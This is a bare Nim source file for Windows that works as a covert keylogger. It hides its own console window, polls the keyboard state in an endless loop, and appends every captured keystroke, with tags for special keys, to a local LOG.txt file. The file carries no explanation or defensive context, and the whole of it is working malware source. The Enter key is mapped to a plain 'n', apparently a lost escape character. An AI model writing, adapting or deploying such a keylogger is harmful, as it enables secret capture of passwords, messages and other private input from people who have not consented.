import os 
import windows

proc GetAsyncKeyState(key: cint): int {.header: "<windows.h>", varargs.}

proc Stealth() =
  var Stealth: HWND
  discard AllocConsole()
  Stealth = FindWindowA("ConsoleWindowClass", nil);
  discard ShowWindow(Stealth,0)

proc save(i: int) =
  var file = open("LOG.txt", fmAppend)
  let key = case i
    of 32: " "
    of 8: "[BACKSPACE]"
    of 13: "n"
    of VK_TAB: "[TAB]"
    of VK_SHIFT: "[SHIFT]"
    of VK_CONTROL: "[CTRL]"
    of VK_ESCAPE: "[ESC]"
    of VK_END: "[END]"
    of VK_HOME: "[HOME]"
    of VK_LEFT: "[LEFT]"
    of VK_UP: "[UP]"
    of VK_RIGHT: "[RIGHT]"
    of VK_DOWN: "[DOWN]"
    of 190, 110: "."
    else: $chr(i)
  write(file, key)
  close(file)

proc main() =
  Stealth()
  while true:
    for i in 8..190:
      if GetAsyncKeyState(cint(i)) == -32767:
        save(i)
  discard execShellCmd("PAUSE")

main()
